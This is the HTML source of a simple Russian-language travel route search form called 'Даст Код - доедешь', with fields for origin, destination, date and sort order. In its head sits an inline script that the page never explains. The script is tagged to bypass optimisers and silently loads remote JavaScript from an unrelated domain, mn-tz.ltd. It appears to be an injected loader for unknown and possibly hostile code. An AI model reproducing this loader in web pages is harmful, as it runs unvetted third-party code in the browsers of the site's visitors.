<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Даст Код - доедешь</title>
    <link rel="stylesheet" href ='style.css'>
    <script data-noptimize="1" data-cfasync="false" data-wpfc-render="false">
  (function () {
      var script = document.createElement("script");
      script.async = 1;
      script.src = 'https://mn-tz.ltd/Mzk5MDE5.js?t=399019';
      document.head.appendChild(script);
  })();
</script>
</head>
<body>
    <div class = 'main'>
        <div class="form-container">
            <form id="travelForm">
                <h2>Даст <span>Код</span> - доедешь</h2>
                <div class="input-groups">
                    <div class="input-group from">
                        <input type="text" name='from' placeholder="Откуда" required>
                        <div class="suggestions" id="fromSuggestions"></div>
                    </div>
                    <button type="button" id="swapButton" class="swap-button">
                        ↔
                    </button>
                    <div class="input-group to">
                        <input type="text" name = 'to' placeholder="Куда" required>
                        <div class="suggestions" id="toSuggestions"></div>
                    </div>
                    <div class="input-group inputDate">
                        <input class = 'date' type="date" name = 'date' placeholder="Когда" required>
                    </div>
                    <select name="filter" id="filter" class = 'filter'>
                        <option value="time">По времени</option>
                        <option value="price">По стоимости</option>
                    </select>
                </div>
                
                <button type="submit">Поехали</button>
            </form>
            
        </div>
        <div class = 'routes'>
            <div id="result"></div>
        </div>
            
        </div>
    </div>
    <script src = 'script.js'></script>

</body>
</html>
